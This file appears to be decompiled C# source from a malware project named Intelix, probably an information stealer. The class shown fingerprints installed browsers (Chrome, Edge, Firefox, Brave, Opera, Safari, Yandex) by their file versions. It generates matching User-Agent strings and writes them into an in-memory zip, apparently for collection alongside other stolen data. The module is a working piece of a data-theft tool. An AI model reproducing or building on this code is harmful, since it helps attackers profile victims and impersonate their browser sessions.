using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Browsers
{
	// Token: 0x0200003B RID: 59
	internal class UserAgentGenerator : ITarget
	{
		// Token: 0x060000C8 RID: 200 RVA: 0x0000BAC4 File Offset: 0x00009CC4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string version = WindowsInfo.GetVersion();
			string architecture = WindowsInfo.GetArchitecture();
			List<UserAgentGenerator.BrowserAgent> list = new List<UserAgentGenerator.BrowserAgent>();
			for (int i = 0; i < this.paths.Length; i++)
			{
				string text = (this.names[i] == "Chrome") ? this.GenerateUserAgentChrome(this.paths[i], version, architecture) : this.GenerateUserAgent(this.paths[i], this.names[i], version, architecture);
				bool flag = !string.IsNullOrEmpty(text);
				if (flag)
				{
					list.Add(new UserAgentGenerator.BrowserAgent
					{
						Name = this.names[i],
						UserAgent = text
					});
				}
			}
			bool flag2 = list.Count != 0;
			if (flag2)
			{
				int maxName = Math.Max("Browser".Length, list.Max((UserAgentGenerator.BrowserAgent a) => a.Name.Length));
				int maxUA = Math.Max("User-Agent".Length, list.Max((UserAgentGenerator.BrowserAgent a) => a.UserAgent.Length));
				List<string> list2 = new List<string>
				{
					"Browser".PadRight(maxName) + " | " + "User-Agent".PadRight(maxUA),
					new string('-', maxName + maxUA + 3)
				};
				list2.AddRange(from a in list
				select a.Name.PadRight(maxName) + " | " + a.UserAgent.PadRight(maxUA));
				zip.AddTextFile("UserAgents.txt", string.Join(Environment.NewLine, list2));
			}
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x0000BC98 File Offset: 0x00009E98
		private string GenerateUserAgent(string browserPath, string name, string osVersion, string architecture)
		{
			bool flag = File.Exists(browserPath);
			string result;
			if (flag)
			{
				result = string.Concat(new string[]
				{
					"Mozilla/5.0 (Windows NT ",
					osVersion,
					"; ",
					architecture,
					") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36 ",
					name,
					"/",
					this.GetBrowserVersion(browserPath)
				});
			}
			else
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x060000CA RID: 202 RVA: 0x0000BD00 File Offset: 0x00009F00
		private string GenerateUserAgentChrome(string browserPath, string osVersion, string architecture)
		{
			bool flag = !File.Exists(browserPath);
			string result;
			if (flag)
			{
				result = string.Empty;
			}
			else
			{
				string browserVersion = this.GetBrowserVersion(browserPath);
				result = string.Concat(new string[]
				{
					"Mozilla/5.0 (Windows NT ",
					osVersion,
					"; ",
					architecture,
					") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
					browserVersion,
					" Safari/537.36"
				});
			}
			return result;
		}

		// Token: 0x060000CB RID: 203 RVA: 0x0000BD68 File Offset: 0x00009F68
		private string GetBrowserVersion(string browserPath)
		{
			bool flag = !File.Exists(browserPath);
			string result;
			if (flag)
			{
				result = "Unknown";
			}
			else
			{
				result = FileVersionInfo.GetVersionInfo(browserPath).FileVersion;
			}
			return result;
		}

		// Token: 0x04000015 RID: 21
		private readonly string[] paths = new string[]
		{
			"C:\\Program Files\\Opera\\launcher.exe",
			"C:\\Program Files\\Apple\\Safari\\Safari.exe",
			"C:\\Program Files\\Mozilla Firefox\\firefox.exe",
			"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
			"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
			"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
			"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe"
		};

		// Token: 0x04000016 RID: 22
		private readonly string[] names = new string[]
		{
			"Opera",
			"Safari",
			"Firefox",
			"Chrome",
			"Edge",
			"Brave",
			"Yandex"
		};

		// Token: 0x020000CF RID: 207
		private class BrowserAgent
		{
			// Token: 0x17000024 RID: 36
			// (get) Token: 0x060002F7 RID: 759 RVA: 0x0001E66C File Offset: 0x0001C86C
			// (set) Token: 0x060002F8 RID: 760 RVA: 0x0001E674 File Offset: 0x0001C874
			public string Name { get; set; }

			// Token: 0x17000025 RID: 37
			// (get) Token: 0x060002F9 RID: 761 RVA: 0x0001E67D File Offset: 0x0001C87D
			// (set) Token: 0x060002FA RID: 762 RVA: 0x0001E685 File Offset: 0x0001C885
			public string UserAgent { get; set; }
		}
	}
}
